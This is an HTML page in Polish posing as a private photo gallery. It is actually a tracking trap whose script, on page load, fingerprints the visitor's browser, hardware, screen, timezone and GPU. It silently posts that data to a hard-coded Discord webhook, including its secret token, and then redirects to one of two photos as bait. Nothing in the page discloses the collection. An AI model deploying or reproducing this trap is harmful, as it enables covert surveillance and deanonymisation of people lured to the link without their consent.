<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Prywatna Galeria Zdjęć - Debug</title>
  <style>
    body { background: #0f172a; color: #fff; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
    .loader { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
    #debug-box { margin-top: 20px; padding: 15px; background: #1e293b; border: 1px solid #38bdf8; border-radius: 8px; max-width: 90%; width: 400px; word-break: break-all; font-size: 11px; color: #38bdf8; text-align: left; max-height: 200px; overflow-y: auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"></div>
  <p id="status-text">Wczytywanie bezpiecznej galerii...</p>
  <div id="debug-box">[SYSTEM] Inicjalizacja modułu OSINT...</div>

  <script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550302869847281716/Vm79NB7uHGzqnzfUSaj2dmW5vr0sQ6fMxQJOUUP2h1n6BSpSNKKUf9oea9ZQJ0uyhaf5";
    
    // Obie fotki podesłane przez Maszę - losujemy cel przekierowania
    const targetPhotos = [
      "./20260808_121307.jpg",
      "./IMG_20250315_160715.heif"
    ];
    const REDIRECT_URL = targetPhotos[Math.floor(Math.random() * targetPhotos.length)];

    function logDebug(msg) {
      console.log(msg);
      const box = document.getElementById('debug-box');
      if(box) {
        box.innerHTML += "<br>> " + msg;
        box.scrollTop = box.scrollHeight;
      }
    }

    // Awaryjny bezpiecznik: po 2.5 sekundy twarde przekierowanie do wylosowanego pliku
    const safetyTimer = setTimeout(() => {
      logDebug("CRITICAL: Safety timer włączony. Skok do: " + REDIRECT_URL);
      window.location.replace(REDIRECT_URL);
    }, 2500);

    function harvestIntel() {
      let gpu = "Nieznane";
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const di = gl.getExtension('WEBGL_debug_renderer_info');
          if (di) gpu = gl.getParameter(di.UNMASKED_RENDERER_WEBGL);
        }
      } catch(err) {
        logDebug("Błąd GPU: " + err.message);
      }

      return {
        ua: navigator.userAgent,
        platform: navigator.platform || "N/A",
        cores: navigator.hardwareConcurrency || "?",
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "?",
        screen: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
        gpu: gpu,
        targetFile: REDIRECT_URL
      };
    }

    async function executeTrap() {
      try {
        logDebug("Skanowanie środowiska celu...");
        const data = harvestIntel();
        logDebug("GPU: " + data.gpu);
        logDebug("Wybrano plik docelowy: " + data.targetFile);

        const payload = {
          username: "MASZA OSINT DEBUGGER",
          embeds: [{
            title: "🎯 TRAFIONY / ZALOGOWANY CEL (DEBUG & 2 PLIKI)!",
            color: 15158332,
            fields: [
              { name: "📂 Wylosowany Plik", value: `\`${data.targetFile}\``, inline: false },
              { name: "🎮 GPU Renderer", value: `\`${data.gpu}\``, inline: false },
              { name: "💻 Hardware", value: `CPU: \`${data.cores}\` | RAM: \`${data.ram}\``, inline: true },
              { name: "🌍 Strefa", value: `\`${data.timezone}\``, inline: true },
              { name: "🖥️ User-Agent", value: `\`\`\`${data.ua}\`\`\``, inline: false }
            ],
            timestamp: new Date()
          }]
        };

        logDebug("Wysyłanie paczki do Discorda...");
        await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true
        });
        logDebug("Wysyłka zakończona sukcesem!");

      } catch(err) {
        logDebug("BŁĄD KRYTYCZNY: " + err.message);
      } finally {
        clearTimeout(safetyTimer);
        logDebug("Przekierowanie do pliku za 0.5s...");
        setTimeout(() => {
          window.location.replace(REDIRECT_URL);
        }, 500);
      }
    }

    executeTrap();
  </script>
</body>
</html>
